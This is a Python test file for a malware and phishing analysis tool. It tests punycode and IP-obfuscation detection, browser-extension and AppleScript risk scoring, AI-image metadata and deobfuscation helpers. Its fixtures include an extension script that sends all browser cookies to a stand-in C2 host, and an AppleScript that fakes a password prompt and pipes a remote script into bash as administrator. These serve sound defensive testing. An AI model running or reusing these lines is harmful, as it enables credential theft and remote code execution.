import pytest
from pathlib import Path
import json
import zipfile
import struct
import zlib

from app.analyzers.domain_analyzer import DomainAnalyzer
from app.analyzers.extension_analyzer import ExtensionAnalyzer
from app.analyzers.applescript_analyzer import AppleScriptAnalyzer
from app.analyzers.ai_image_verifier import AIImageVerifier
from app.analyzers.deobfuscator import Deobfuscator

def test_domain_analyzer_punycode_and_obfuscation():
    # Test Punycode homoglyph: apple.com with Cyrillic 'а'
    puny_domain = "xn--pple-43d.com"
    res = DomainAnalyzer.analyze(puny_domain)
    puny = res["punycode_analysis"]
    assert puny.get("is_punycode") is True
    assert puny.get("unicode_rendered") == "аpple.com"
    assert puny.get("is_homograph") is True
    assert len(puny.get("spoofed_chars", [])) > 0
    assert puny["spoofed_chars"][0]["latin_lookalike"] == "a"
    
    # Test IP obfuscation detection
    hex_url = "http://0x7f000001/payload"
    obf = DomainAnalyzer.detect_obfuscation(hex_url)
    assert obf["is_obfuscated"] is True
    assert any(t["type"] == "HEX_IP" for t in obf["techniques"])
    
    # Test Dword IP
    dword_url = "http://2130706433/"
    obf_dw = DomainAnalyzer.detect_obfuscation(dword_url)
    assert obf_dw["is_obfuscated"] is True
    assert any(t["type"] == "DWORD_IP" for t in obf_dw["techniques"])


def test_extension_analyzer(tmp_path: Path):
    manifest = {
        "manifest_version": 3,
        "name": "Security Test Extension",
        "version": "1.0.0",
        "description": "A test extension for FileSanitizer",
        "permissions": [
            "webRequest",
            "cookies",
            "tabs",
            "<all_urls>"
        ],
        "background": {
            "service_worker": "background.js"
        },
        "content_security_policy": {
            "extension_pages": "script-src 'self' 'unsafe-eval' https://evil.cdn.com;"
        }
    }
    
    bg_js = """
    console.log("Background initialized");
    eval("var x = 10;");
    chrome.cookies.getAll({}, function(cookies) {
        navigator.sendBeacon("https://c2.evil-tracker.com/exfil", JSON.stringify(cookies));
    });
    """
    
    crx_zip = tmp_path / "test_ext.zip"
    with zipfile.ZipFile(crx_zip, "w") as zf:
        zf.writestr("manifest.json", json.dumps(manifest))
        zf.writestr("background.js", bg_js)
        
    res = ExtensionAnalyzer.analyze(crx_zip, "test_ext.zip")
    assert res["is_extension"] is True
    assert res["name"] == "Security Test Extension"
    assert res["manifest_version"] == 3
    assert res["risk_score"] >= 60
    assert res["risk_level"] in ["HIGH RISK", "CRITICAL"]
    assert len(res["permissions"]["critical"]) > 0
    assert any("webRequest" in p["permission"] or "all_urls" in p["permission"] for p in res["permissions"]["critical"])
    assert res["csp"]["allows_unsafe_eval"] is True
    assert res["csp"]["allows_remote_scripts"] is True
    assert len(res["js_findings"]) >= 2


def test_applescript_analyzer(tmp_path: Path):
    script_content = """
    display dialog "System Update Requires Admin Password" default answer "" with hidden answer
    set pwd to text returned of result
    do shell script "curl -s http://attacker-c2.ru/stage2.sh | bash" with administrator privileges
    tell application "System Events" to keystroke "secret"
    """
    
    as_file = tmp_path / "payload.applescript"
    as_file.write_text(script_content)
    
    res = AppleScriptAnalyzer.analyze(as_file, "payload.applescript")
    assert res["is_applescript"] is True
    assert res["risk_score"] >= 70
    assert res["risk_level"] in ["HIGH RISK", "CRITICAL"]
    assert any("Privilege Escalation" in f["title"] for f in res["findings"])
    assert any("Credential Harvesting" in f["title"] or "Password Dialog" in f["title"] for f in res["findings"])
    assert any("Keystroke" in f["title"] for f in res["findings"])
    assert "http://attacker-c2.ru/stage2.sh" in res["iocs"]["urls"]


def test_ai_image_verifier_synthetic_detection(tmp_path: Path):
    png_bytes = bytes([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,  # Signature
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,  # IHDR len + type
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
        0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4, 0x89
    ])
    
    txt_data = b"parameters\x00cyberpunk neon detective, photorealistic, 8k\nNegative prompt: blurry, deformed\nSteps: 30, Sampler: DPM++ 2M, CFG scale: 7, Seed: 123456"
    txt_chunk = struct.pack(">I", len(txt_data)) + b"tEXt" + txt_data + struct.pack(">I", zlib.crc32(b"tEXt" + txt_data))
    iend_chunk = struct.pack(">I", 0) + b"IEND" + struct.pack(">I", zlib.crc32(b"IEND"))
    
    full_png = png_bytes + txt_chunk + iend_chunk
    img_file = tmp_path / "ai_sd.png"
    img_file.write_bytes(full_png)
    
    res = AIImageVerifier.verify_image(img_file)
    assert res["is_ai_generated"] is True
    assert res["confidence"] in ["CONFIRMED_AI", "LIKELY_AI"]
    assert res["generator_tool"] == "Stable Diffusion"
    assert "cyberpunk neon detective" in res["prompt_metadata"]["prompt"]
    assert "blurry, deformed" in res["prompt_metadata"]["negative_prompt"]


def test_cyberchef_deobfuscator_operations():
    # Test ROT47
    text = "Hello World 123"
    rot47_enc = Deobfuscator.rot47(text)
    assert Deobfuscator.rot47(rot47_enc) == text
    
    # Test Caesar cipher brute-force
    caesar_shifted = "Khoor Zruog"  # "Hello World" shifted by 3
    candidates = Deobfuscator.caesar_bruteforce(caesar_shifted)
    assert any(c["shift"] == 3 and "Hello World" in c["text"] for c in candidates)
    
    # Test HTML entities
    html_ent = "&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;"
    assert Deobfuscator.html_entity_decode(html_ent) == '<script>alert("xss");</script>'
    
    # Test URL double decode
    double_url = "%253Cscript%253E"
    assert Deobfuscator.url_double_decode(double_url) == "<script>"
    
    # Test Defang / Refang
    ioc = "http://malicious.evil.com/dropper.exe"
    defanged = Deobfuscator.defang_ioc(ioc)
    assert "hxxp" in defanged or "[.]" in defanged
    refanged = Deobfuscator.refang_ioc(defanged)
    assert refanged == ioc
    
    # Test IP conversions
    ip = "192.168.1.1"
    conv = Deobfuscator.convert_ip_formats(ip)
    assert "0300.0250" in conv["octal"]


def test_domain_analyzer_whois_and_registered_domain():
    # Test registered domain extraction
    assert DomainAnalyzer.get_registered_domain("www.folksam.se") == "folksam.se"
    assert DomainAnalyzer.get_registered_domain("sub.test.google.com") == "google.com"
    assert DomainAnalyzer.get_registered_domain("news.bbc.co.uk") == "bbc.co.uk"
    assert DomainAnalyzer.get_registered_domain("folksam.se") == "folksam.se"

    # Test analyze on folksam.se
    res = DomainAnalyzer.analyze("folksam.se")
    whois = res["whois"]
    assert whois["status"] == "ACTIVE"
    assert whois["registrar"] == "Abion AB"
    assert whois["registration_date"] == "1994-08-01"
    assert whois["domain_age_days"] is not None
    assert whois["domain_age_days"] > 10000
    assert "32 years" in whois["domain_age_formatted"]
    # Newly registered flag should NOT be present
    assert not any("Newly Registered" in f.get("title", "") for f in res.get("risk_flags", []))
